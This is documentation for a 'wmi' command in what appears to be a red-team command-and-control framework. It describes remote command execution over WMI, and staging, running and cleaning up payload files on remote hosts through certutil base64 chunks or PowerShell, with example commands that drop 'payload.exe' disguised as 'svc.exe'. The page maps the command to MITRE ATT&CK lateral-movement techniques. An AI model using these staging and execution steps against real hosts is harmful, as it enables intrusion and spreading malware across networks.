+++
title = "wmi"
chapter = false
weight = 200
hidden = false
+++

{{% notice info %}}Windows Only{{% /notice %}}

## Summary

Execute WMI queries, remote process creation, file upload, and staged execution via COM API (no subprocess creation). Uses SWbemLocator COM interface for queries and Win32_Process.Create method for remote execution. File staging uses certutil or PowerShell encoding for transfer. Supports local and remote targets.

### Arguments

| Parameter | Type | Required | Default | Description |
|-----------|------|----------|---------|-------------|
| action | choose_one | Yes | - | `execute`, `query`, `process-list`, `os-info`, `upload`, `exec-staged`, or `check` |
| target | string | No | - | Remote host to target. If omitted, runs against the local system. |
| command | string | No | - | Command to execute. Required when action is `execute`. |
| query | string | No | - | WMI query string. Required when action is `query`. |
| local_path | string | No | - | Local file path to upload. Required for `upload` and `exec-staged`. |
| remote_path | string | No | C:\Windows\Temp\<random>.exe | Destination path on the target. |
| method | choose_one | No | certutil | Staging method: `certutil` (chunked base64) or `powershell` (single command, <150KB). |
| cleanup | boolean | No | true | Remove staged file after execution (`exec-staged` only). |

## Usage

### Execute a Command

Run a command on the local system:
```
wmi -action execute -command "C:\Windows\Temp\payload.exe"
```

Run a command on a remote host:
```
wmi -action execute -target 192.168.1.50 -command "C:\Windows\Temp\payload.exe"
```

### Run a Custom WMI Query

Query locally:
```
wmi -action query -query "SELECT Name,ProcessId FROM Win32_Process WHERE Name='svchost.exe'"
```

Query a remote host:
```
wmi -action query -target 192.168.1.50 -query "SELECT * FROM Win32_Service WHERE State='Running'"
```

### List Processes

List processes on the local system:
```
wmi -action process-list
```

List processes on a remote host:
```
wmi -action process-list -target 192.168.1.50
```

### Get OS Information

Get OS details for the local system:
```
wmi -action os-info
```

Get OS details for a remote host:
```
wmi -action os-info -target 192.168.1.50
```

### Upload a File to Remote Host
```
wmi -action upload -target 192.168.1.50 -local_path "C:\Users\Public\payload.exe" -remote_path "C:\Windows\Temp\svc.exe" -method certutil
```
Stages a file on the remote host using certutil base64 encoding via WMI process creation.

### Stage and Execute (Upload + Run + Cleanup)
```
wmi -action exec-staged -target 192.168.1.50 -local_path "C:\Users\Public\payload.exe" -cleanup true
```
Uploads the file, executes it, and removes it from the target. Auto-generates a random filename in `C:\Windows\Temp\` if `-remote_path` is not specified.

### Stage and Execute via PowerShell
```
wmi -action exec-staged -target 192.168.1.50 -local_path "C:\Users\Public\small.exe" -method powershell
```
Uses PowerShell `[IO.File]::WriteAllBytes` for files under 150KB. Single command — faster but limited by command line length.

### Pre-Flight Check
Validate WMI prerequisites before executing:
```
wmi -action check -target 192.168.1.50
```
Returns JSON with pass/fail for: RPC port 135, WMI connectivity, WQL query access, and Win32_Process accessibility.

## Operational Notes

- `upload` and `exec-staged` read the local file, encode it, and execute staging commands via Win32_Process.Create on the target
- `certutil` method splits large files into base64 chunks and decodes on the target — works for any file size
- `powershell` method is faster but limited to ~150KB files due to command line length constraints
- `exec-staged` with `-cleanup true` (default) runs `del <remote_path>` after execution
- Both staging actions require admin privileges on the target host

## MITRE ATT&CK Mapping

- T1047 -- Windows Management Instrumentation
- T1570 -- Lateral Tool Transfer
